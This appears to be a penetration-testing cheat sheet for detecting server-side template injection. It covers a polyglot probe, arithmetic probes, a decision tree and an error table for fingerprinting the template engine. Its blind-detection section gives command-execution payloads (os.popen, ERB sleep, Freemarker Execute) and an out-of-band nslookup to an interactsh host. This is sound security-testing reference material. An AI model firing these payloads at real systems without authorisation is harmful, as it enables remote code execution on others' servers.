# SSTI Detection & Engine Fingerprinting

## 1. The polyglot

```
${{<%[%'"}}%\
```

This string is syntactically invalid in essentially every template language at
once. Inject it raw (URL-encode when needed: `%24%7B%7B%3C%25%5B%25%27%22%7D%7D%25%5C`).

Interpretation of the result:

- **5xx / rendered stack trace / template error** — the input reaches a parser.
  Read the error string (table below); it usually names the engine, the
  template file, and sometimes the line of your injection.
- **Literal echo** — not conclusive of "safe": some engines (Velocity,
  Freemarker in some modes, Smarty with silenced errors) swallow bad syntax.
  Always follow with arithmetic probes.
- **Partial echo** (pieces of the polyglot missing) — an expression delimiter
  was consumed. Strong SSTI signal; identify which delimiter vanished.

## 2. Arithmetic confirmation probes (ordered)

Wrap each in unique markers (`s9l…s9r`) so evaluation is grep-able even in a
large page, and so you can tell *your* 49 from a coincidental 49:

| # | Probe | `49` ⇒ engine family |
|---|---|---|
| 1 | `{{7*7}}` | Jinja2 / Twig / Nunjucks / Django-ish |
| 2 | `${7*7}` | Freemarker / Velocity / Mako / JSP EL / Groovy GString |
| 3 | `#{7*7}` | Pug (Jade) / Slim / Ruby string interpolation / JSF EL |
| 4 | `<%= 7*7 %>` | ERB (Ruby) / EJS (JS) / classic ASP |
| 5 | `{7*7}` | Smarty / some custom engines |
| 6 | `[[${7*7}]]` or `*{7*7}` | Thymeleaf |
| 7 | `#{7*7}` in `*.xhtml` params | JSF / SpEL contexts |
| 8 | `@(7*7)` | Razor (.NET) |
| 9 | `{{= 7*7 }}` / `<%- 7*7 %>` | doT / EJS variants |

Django templates evaluate `{{7*7}}` to nothing (no arithmetic) — use
`{% debug %}` or `{{settings.SECRET_KEY}}`-style probes; Django SSTI is
info-leak, not direct RCE.

## 3. Differential decision tree

```
{{7*7}} == 49
├── {{7*'7'}} == 7777777          → Jinja2  (Python repeats strings)
├── {{7*'7'}} == 49               → Twig    (PHP coerces '7'→7)
├── {{7*'7'}} errors:
│   ├── {{range.constructor}} returns "function Function(){...}" → Nunjucks (JS)
│   ├── {{dump(app)}} or {{_self}} works                         → Twig/Symfony
│   └── {{config}} dumps a Flask Config object                   → Jinja2/Flask
└── (ambiguous) {{joiner}}/{{cycler}} resolve → Jinja2; {{max(1,2)}} → Twig

${7*7} == 49
├── ${"z"?upper_case} == Z        → Freemarker  (?built-ins are Freemarker-only)
├── ${7*'7'} == 7777777           → Mako        (Python semantics)
├── #set($x=7*7)${x} == 49        → Velocity    ($ refs + # directives)
├── ${T(java.lang.Math).random()} evaluates → SpEL (Thymeleaf/Spring)
└── ${{7*7}} == 49                → Groovy GString / JSP EL — try ${7*7} vs ${{7*7}}

#{7*7} == 49
├── #{7*'7'} == "7777777"         → Ruby interpolation / Slim
├── works only inside attributes/text of a Pug page → Pug
└── #{session} dumps FacesContext → JSF EL

<%= 7*7 %> == 49
├── <%= `echo erb` %> executes    → ERB (backticks = Ruby shell)
└── <%- 7*7 %> / <%= require %> JS semantics → EJS

{7*7} == 49
└── {$smarty.version} prints a version → Smarty
```

## 4. Error-message → engine table

| Error fragment | Engine |
|---|---|
| `jinja2.exceptions.TemplateSyntaxError` | Jinja2 |
| `Twig\Error\SyntaxError` / `Unexpected character` + Twig trace | Twig |
| `freemarker.core.ParseException` / `FreeMarker template error` | Freemarker |
| `org.apache.velocity` / `VelocityException` / `Lexical error ... TemplateParseException` | Velocity |
| `SmartyCompilerException` / `Syntax error in template` | Smarty |
| `mako.exceptions` / `SyntaxException` with Python trace | Mako |
| `(erb):1:` / `SyntaxError ... .erb` | ERB |
| `Template render error` + JS stack | Nunjucks |
| `Cannot read properties of undefined` + pug/jade files in stack | Pug |
| `org.thymeleaf.exceptions.TemplateProcessingException` | Thymeleaf |
| `org.springframework.expression.spel` | SpEL |
| `django.template.exceptions.TemplateSyntaxError` | Django |
| `System.Web.HttpCompileException` / Razor compile error | Razor |

## 5. Context handling

- **URL-encode** every payload in query strings (`{{7*7}}` → `%7B%7B7*7%7D%7D`).
- If injection lands **inside an existing expression** (e.g. value placed into
  `{{ user.name }}`), break out first: probe `"}}{{7*7}}{{"` or `')}}{{7*7}}`.
- If HTML-encoding mangles output, use arithmetic producing digits only (no
  `<>&"`), or compare response length/time instead.
- Stored sinks (emails, PDFs, admin views) render later — tag each payload
  with a unique id (`s9l-<n>-{{7*7}}`) so you can attribute delayed hits.
- Headers (`User-Agent`, `Referer`, `X-Forwarded-For`) feed error pages and
  analytics templates — probe them too.

## 6. Blind detection

No reflection anywhere:

1. Time: `{{cycler.__init__.__globals__.os.popen('sleep 5').read()}}` /
   `<%= sleep(5) %>` / `${"freemarker...Execute"?new()("sleep 5")}` — compare
   to a `sleep 0` baseline, 3 trials each.
2. OOB: start `interactsh-client -json -o oast.json`, take the
   `<id>.oast.pro` hostname, make the command `nslookup <id>.oast.pro`.
   DNS-only hits still prove execution.
3. Error-oracle: send a valid expression vs an invalid one (`{{7*7}}` vs
   `{{7*}}`); a status/length difference means parsing happens even if output
   never reaches you.
